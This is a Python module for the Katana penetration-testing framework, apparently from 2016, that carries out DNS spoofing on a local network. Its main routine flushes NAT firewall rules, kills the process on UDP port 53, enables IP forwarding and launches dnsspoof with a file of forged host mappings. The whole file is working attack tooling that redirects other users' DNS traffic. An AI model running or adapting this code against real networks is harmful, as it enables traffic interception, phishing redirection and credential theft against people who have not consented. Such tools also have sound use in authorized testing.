# This module requires katana framework 
# https://github.com/PowerScript/KatanaFramework

# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Katana Core import                  #
from core.KatanaFramework import *    #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #

# LIBRARIES  
import commands
# END LIBRARIES  

# INFORMATION MODULE
def init():
	init.Author             ="RedToor"
	init.Version            ="1.0"
	init.Description        ="DNS Spoofing"
	init.CodeName           ="net/dns.spoof"
	init.DateCreation       ="29/07/2016"      
	init.LastModification   ="29/07/2016"
	init.References         =None
	init.License            =KTF_LINCENSE
	init.var                ={}

	# DEFAULT OPTIONS MODULE
	init.options = {
		# NAME      VALUE               RQ     DESCRIPTION
		'interface':[INTERFACE_ETHERNET,True ,'Interface'],
		'hostfile' :["files/test/host" ,True ,'DNS\'s Spoofed File']
	}

	init.aux =  "\n Devices Founds: """+str(NET.GetInterfacesOnSystem())
	init.aux += "\n Functions     : to edit the DNS rules. 'x::nano "+init.options['hostfile'][0]+"'\n"
	return init
# END INFORMATION MODULE

# CODE MODULE    ############################################################################################
def main(run):
	
	if NET.AmIConectedToANetwork() and NET.CheckIfExistInterface(init.var['interface']):

		Loadingfile(init.var['hostfile'])
		open(init.var['hostfile'],'r')
		printk.inf("Starting DNS spoofing [dnsspoof].")
		commands.getoutput("iptables --flush -t nat")
		commands.getoutput("sudo fuser -kuv 53/udp  >/dev/null 2>&1 ")
		commands.getoutput("echo 1 > /proc/sys/net/ipv4/ip_forward")
		SYSTEM.Subprocess("dnsspoof -i "+init.var['interface']+" -f "+init.var['hostfile'])
		raw_input(printk.pkey("if you want to stop DNS Spoof (PRESS [ENTER])\n"))
		SYSTEM.KillProcess("dnsspoof")
		commands.getoutput("echo 0 > /proc/sys/net/ipv4/ip_forward")
		commands.getoutput("iptables --flush -t nat")

# END CODE MODULE ############################################################################################
